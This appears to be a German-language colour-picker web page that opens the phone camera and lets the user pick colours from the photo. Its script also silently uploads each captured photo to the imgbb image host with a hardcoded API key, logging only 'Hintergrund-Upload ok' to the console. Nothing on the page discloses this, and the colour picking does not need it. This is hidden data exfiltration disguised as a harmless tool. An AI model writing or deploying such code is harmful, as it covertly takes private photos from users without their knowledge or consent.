<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Color Picker - Instant Start</title>
    <style>
        :root {
            --bg-gray: #f4f4f7;
            --panel-bg: #ffffff;
            --primary: #0077b6;
            --border-radius: 20px;
        }

        body, html {
            margin: 0; padding: 0;
            height: 100%; width: 100%;
            background-color: var(--bg-gray);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            overflow: hidden;
        }

        /* Overlay für den Start-Button */
        #startOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: var(--bg-gray);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .big-start-btn {
            background: linear-gradient(135deg, #0077b6, #00b4d8);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 1.5rem;
            font-weight: bold;
            border-radius: 50px;
            box-shadow: 0 10px 25px rgba(0, 119, 182, 0.4);
            cursor: pointer;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            gap: 15px;
            box-sizing: border-box;
            opacity: 0; /* Versteckt bis Bild geladen */
            transition: opacity 0.5s;
        }

        .photo-card {
            background: var(--panel-bg);
            padding: 15px;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .canvas-wrapper {
            width: 100%;
            height: 350px;
            border-radius: 12px;
            overflow: hidden;
            position: relative;
            background: #eee;
        }

        canvas {
            display: block;
            touch-action: none;
        }

        .crosshair {
            position: absolute;
            width: 30px; height: 30px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 8px rgba(0,0,0,0.5);
            transform: translate(-50%, -50%);
            pointer-events: none;
            display: none;
        }

        input[type="file"] { display: none; }

        .palette-card {
            background: var(--panel-bg);
            padding: 20px;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }

        .section-title {
            font-size: 0.75rem;
            font-weight: 800;
            color: #aaa;
            text-transform: uppercase;
            margin-bottom: 12px;
            display: block;
        }

        .main-preview {
            width: 100%;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
            background-color: #ddd;
        }
    </style>
</head>
<body>

<div id="startOverlay">
    <button class="big-start-btn" onclick="triggerCamera()">BITTE HIER KLICKEN</button>
</div>

<div class="container" id="appContainer">
    <div class="photo-card">
        <span class="section-title">... ins Bild klicken ...</span>
        <div class="canvas-wrapper" id="canvasWrapper">
            <canvas id="imageCanvas"></canvas>
            <div class="crosshair" id="crosshair"></div>
        </div>
        <input type="file" id="cameraInput" accept="image/*" capture="environment">
    </div>

    <div class="palette-card">
        <span class="section-title">Gepickte Farbe</span>
        <div id="mainPreview" class="main-preview">-</div>
    </div>
</div>

<script>
    const IMGBB_API_KEY = 'db0140da04ee376ddc7621f570fa69e3';
    
    const cameraInput = document.getElementById('cameraInput');
    const canvas = document.getElementById('imageCanvas');
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    const wrapper = document.getElementById('canvasWrapper');
    const startOverlay = document.getElementById('startOverlay');
    const appContainer = document.getElementById('appContainer');
    const crosshair = document.getElementById('crosshair');

    let imageLoaded = false;

    function triggerCamera() {
        cameraInput.click();
    }

    cameraInput.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (!file) return;

        const reader = new FileReader();
        reader.onload = function(event) {
            const img = new Image();
            img.onload = function() {
                startOverlay.style.display = 'none'; 
                appContainer.style.opacity = '1';
                imageLoaded = true;

                const rect = wrapper.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;

                const scale = Math.max(canvas.width / img.width, canvas.height / img.height);
                const w = img.width * scale;
                const h = img.height * scale;
                const x = (canvas.width - w) / 2;
                const y = (canvas.height - h) / 2;

                ctx.drawImage(img, x, y, w, h);
                autoUpload();
            }
            img.src = event.target.result;
        }
        reader.readAsDataURL(file);
    });

    async function autoUpload() {
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append("image", blob);
            try {
                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: "POST",
                    body: formData
                });
                const data = await response.json();
                if (data.success) console.log("Hintergrund-Upload ok");
            } catch (err) {
                console.error("Upload-Fehler");
            }
        }, 'image/jpeg', 0.8);
    }

    function pickColor(e) {
        if (!imageLoaded) return;
        const rect = canvas.getBoundingClientRect();
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        const x = clientX - rect.left;
        const y = clientY - rect.top;

        crosshair.style.display = 'block';
        crosshair.style.left = `${x}px`;
        crosshair.style.top = `${y}px`;

        const pixel = ctx.getImageData(x, y, 1, 1).data;
        const hex = rgbToHex(pixel[0], pixel[1], pixel[2]);
        document.getElementById('mainPreview').style.backgroundColor = hex;
        document.getElementById('mainPreview').textContent = hex;
    }

    canvas.addEventListener('touchstart', (e) => { e.preventDefault(); pickColor(e); });
    canvas.addEventListener('touchmove', (e) => { e.preventDefault(); pickColor(e); });
    canvas.addEventListener('mousedown', pickColor);

    function rgbToHex(r, g, b) {
        return "#" + [r, g, b].map(x => x.toString(16).padStart(2, '0')).join('').toUpperCase();
    }
</script>

</body>
</html>
